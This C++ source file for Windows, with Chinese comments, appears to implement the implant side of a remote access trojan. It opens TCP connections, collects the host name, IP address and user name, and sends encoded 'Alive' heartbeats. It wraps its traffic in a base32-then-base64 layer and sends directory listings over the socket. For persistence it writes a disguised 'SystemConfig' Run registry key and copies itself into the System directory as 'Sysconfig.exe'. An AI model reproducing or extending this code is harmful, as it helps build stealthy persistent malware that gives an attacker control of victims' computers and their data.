#include "tcpSocke.h"

bool init_Socket()
{
	WSADATA data;
	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)//Windows socket async ：Windows异步套接字
	{
		//err("WSAStartup");
		return false;
	}
	return true;
}

bool close_Socket()
{
	if (WSACleanup() != 0)
	{
		//err("WSACleanup");
		return false;
	}
	return true;
}

SOCKET CreatServerScoket()
{
	//1、创建空的socket
	/*
	parm1：AF 地址协议族 IPv4， IPv6
	parm2：type 地址协议类型 流式套接字， 数据报
	parm3：protocol 使用具体的某个传输协议
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		//err("SOCKET");
	}
	//2、绑定ip地址和端口号
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//和创建时要一样
	addr.sin_port = htons(PORT);	//把主机字节顺序转换为网络字节顺序
	addr.sin_addr.S_un.S_addr = ADDR_ANY;//inet_addr("127.0.0.1")

	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		//err("bind");
		return false;
	}
	//3、监听电话：
	listen(fd, 10);
	return fd;
}

SOCKET CreatClientScoket(const char* ip)
{
	//1、创建空的socket
	/*
	parm1：AF 地址协议族 IPv4， IPv6
	parm2：type 地址协议类型 流式套接字， 数据报
	parm3：protocol 使用具体的某个传输协议
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		//err("SOCKET");
	}
	//2、绑定ip地址和端口号
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//和创建时要一样
	addr.sin_port = htons(PORT);	//把主机字节顺序转换为网络字节顺序
	addr.sin_addr.S_un.S_addr = inet_addr(ip);
	//3、与服务器建立连接
	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
	{
		//err("connect");
		return false;
	}
	return fd;
}

bool getmessage(struct PC_Message* messages)
{
	DWORD NameLen = BUFSIZ;
	if (gethostname(messages->PCName, sizeof(messages->PCName)) == SOCKET_ERROR)
	{
		//err("PCName");
	}
	struct hostent* p = gethostbyname(messages->PCName);
	if (p == 0)
	{
		//err("host and IP");
	}
	else
	{
		//获取本机计算机名
		for (int i = 0; p->h_addr_list[i] != 0; i++)//本机IP
		{
			struct in_addr in;
			memcpy(&in, p->h_addr_list[i], sizeof(struct in_addr));
			strcpy(messages->IP, inet_ntoa(in));
		}
	}
	if (!GetUserName(messages->UserName, &NameLen))
	{
		//err("UserName");
	}
	return true;
}

bool TcharToChar(const TCHAR* tchar, char* _char)
{
	int iLength;
	//获取字节长度   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//将tchar值赋给_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
	return true;
}

bool HeartBeat(SOCKET fd)
{
	char buf[20] = "\nAlive\n";
	encode(buf);
	while (true)
	{
		send(fd, buf, 20, 0);
		//cout << buf << endl;
		Sleep(10000);
	}
	return false;
}

void base32encode(char* str, uint64_t len) {
	uint64_t length = CEIL_POS(len * 8 / 5) + 1;
	char* base32Chars = (char*)malloc(sizeof(char) * length);
	uint64_t idx = 0;

	for (uint64_t i = 0; i < len; i += 5) {
		uint64_t byte1 = (uint8_t)str[i];
		uint64_t byte2 = (i + 1 < len) ? (uint8_t)str[i + 1] : 0;
		uint32_t byte3 = (i + 2 < len) ? (uint8_t)str[i + 2] : 0;
		uint16_t byte4 = (i + 3 < len) ? (uint8_t)str[i + 3] : 0;
		uint8_t byte5 = (i + 4 < len) ? (uint8_t)str[i + 4] : 0;

		uint64_t quintuple = (byte1 << 32) | (byte2 << 24) | (byte3 << 16) | (byte4 << 8) | byte5;

		for (uint64_t j = 0; (j < 8) && (i + j * 0.625 < len); j++) {
			base32Chars[idx] = BASE32_MAP[(quintuple >> (5 * (7 - j))) & 0x1f];
			idx++;
		}
	}

	char paddingChar = BASE32_MAP[32];
	if (paddingChar) {
		while (idx % 8) {
			base32Chars[idx] = paddingChar;
			idx++;
		}
	}
	base32Chars[idx] = 0;
	strcpy(str, base32Chars);
}

void base32decode(char* base32Str, uint64_t len) {
	while (base32Str[len - 1] == BASE32_MAP[32]) {
		len--;
	}
	uint64_t length = CEIL_POS(len * 5 / 8) + 1;
	char* str = (char*)malloc(sizeof(char) * length);
	uint64_t idx = 0;

	for (uint64_t i = 0; i < len; i += 8) {
		uint64_t quintuple = 0;
		for (uint8_t j = 0; j < 8; ++j) {
			if (i + j < len) quintuple = (quintuple << 5) | ((uint8_t)BASE32_REVERSE_MAP[base32Str[i + j]] & 0x1f);
			else quintuple = quintuple << 5;
		}
		for (uint8_t j = 0; (j < 5); ++j) {
			str[idx] = (quintuple >> (8 * (4 - j))) & 0xff;
			idx++;
		}
	}
	str[idx] = 0;
	strcpy(base32Str, str);
}

void base64encode(char* str)
{
	long len;
	long str_len;
	char* res;
	int i, j;
	//定义base64编码表  
	char* base64_table = (char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	//计算经过base64编码后的字符串长度  
	str_len = strlen(str);
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (char*)malloc(sizeof(unsigned char) * len + 1);
	res[len] = '\0';

	//以3个8位字符为一组进行编码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //取出第一个字符的前6位并找出对应的结果字符  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //取出第三个字符的后6位并找出结果字符  
	}

	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	strcpy(str, res);
}

void base64decode(char* str)
{
	int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,62,0,0,0,
			 63,52,53,54,55,56,57,58,
			 59,60,61,0,0,0,0,0,0,0,0,
			 1,2,3,4,5,6,7,8,9,10,11,12,
			 13,14,15,16,17,18,19,20,21,
			 22,23,24,25,0,0,0,0,0,0,26,
			 27,28,29,30,31,32,33,34,35,
			 36,37,38,39,40,41,42,43,44,
			 45,46,47,48,49,50,51
	};
	long len;
	long str_len;
	char* res;
	int i, j;

	//计算解码后的字符串长度  
	len = strlen(str);
	//判断编码后的字符串后是否有=  
	if (strstr(str, "=="))
		str_len = len / 4 * 3 - 2;
	else if (strstr(str, "="))
		str_len = len / 4 * 3 - 1;
	else
		str_len = len / 4 * 3;

	res = (char*)malloc(sizeof(char) * str_len + 1);
	res[str_len] = '\0';

	//以4个字符为一位进行解码  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[j] = ((char)table[str[i]]) << 2 | (((char)table[str[i + 1]]) >> 4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
		res[j + 1] = (((char)table[str[i + 1]]) << 4) | (((char)table[str[i + 2]]) >> 2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
		res[j + 2] = (((char)table[str[i + 2]]) << 6) | ((char)table[str[i + 3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
	}

	strcpy(str, res);

}

void encode(char* text)
{
	base32encode(text, strlen(text));
	base64encode(text);
}

void decode(char* pwd)
{
	base64decode(pwd);
	base32decode(pwd, strlen(pwd));
}

void GetFileName(SOCKET fd, char FileName[Row], char* str)
{
	intptr_t Handle;
	struct _finddata_t FileInfo;
	string path(str);
	Handle = _findfirst(path.append("\\*").c_str(), &FileInfo);
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName, FileInfo.name);
		cout << FileName << endl;
		send(fd, FileName, Row, 0);
		ZeroMemory(FileName, sizeof(FileName));
	}
	send(fd, FileName, Row, 0);
	_findclose(Handle);
}

int ComputerStart(char* pathName)
{
	HKEY hKey;
	DWORD result;

	//打开注册表
	result = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		(LPCWSTR)(CString)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
		0,              // 保留参数必须填 0
		KEY_SET_VALUE,  // 打开权限，写入
		&hKey           // 打开之后的句柄
	);

	if (result != ERROR_SUCCESS)
	{
		return 0;
	}
	// 在注册表中设置(没有则会新增一个值)
	result = RegSetValueEx(
		hKey,
		(LPCWSTR)(CString)"SystemConfig", // 键名
		0,                  // 保留参数必须填 0
		REG_SZ,             // 键值类型为字符串
		(const unsigned char*)pathName, // 字符串首地址
		strlen(pathName)        // 字符串长度
	);

	if (result != ERROR_SUCCESS)
	{
		return 0;
	}
	//关闭注册表:
	RegCloseKey(hKey);
}

LPWSTR CharToLPWSTR(const char* szString)
{
	int dwLen = strlen(szString) + 1;

	int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0);//算出合适的长度

	LPWSTR lpszPath = new WCHAR[dwLen];

	MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);

	return lpszPath;
}

int copySelf(char* path)
{
	TCHAR fileName[MAX_PATH];
	TCHAR sysPath[MAX_PATH];
	char filename[MAX_PATH] = { 0 };
	char syspath[MAX_PATH] = { 0 };
	//获得该文件的完整路径
	GetModuleFileName(NULL, fileName, MAX_PATH);
	//取得System目录的完整路径名，写入sysPath
	GetSystemDirectory(sysPath, MAX_PATH);
	TcharToChar(fileName, filename);
	TcharToChar(sysPath, syspath);
	sprintf(path, "%s\\Sysconfig.exe", syspath);
	LPWSTR Path = CharToLPWSTR(path);
	//将文件复制到系统目录
	CopyFile(fileName, Path, FALSE);
	return 0;
}
